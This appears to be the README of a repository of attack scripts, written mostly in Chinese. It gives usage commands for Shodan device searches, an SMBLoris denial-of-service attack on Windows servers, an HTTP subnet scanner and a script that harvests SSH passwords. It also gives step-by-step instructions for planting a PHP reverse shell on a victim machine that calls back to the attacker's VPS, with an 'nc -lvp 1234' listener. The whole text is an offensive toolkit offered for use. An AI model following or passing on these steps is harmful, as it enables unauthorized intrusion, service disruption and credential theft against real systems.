# Th1s 1s a rep0 ab0ut h3cking scr1pts

# shodan

调用shodan api 统计设备数量,如weblogic

shodancount.py weblogic

调用shodan api 搜索设备,如weblogic

shodansearch.py weblogic

# SMBLoris 通过smb对Windows服务器实施DOS攻击

chmod +x run10.sh

sh run10.sh

# httpscan 一个http简易扫描脚本

如要扫描192.168.0.0/24

httpscan.py 192.168.0.0/24

# dump_ssh_password 一个提取ssh密码的脚本

chmod +x ssh_password.sh

sh password.sh

然后新建一个窗口ssh登录，就可以看见ssh密码

# php-reverse-shell 一个基于php的反弹shell的脚本

把php-reverse-shell.php中49行的地址改为自己的公网vps

上传该脚本到被攻击的机器上

登录自己的公网vps，监听1234端口

nc -lvp 1234

在被攻击的机器上执行脚本，即可在vps上看到shell

php php-reverse-shell.php

# Hope you enjoy ^_^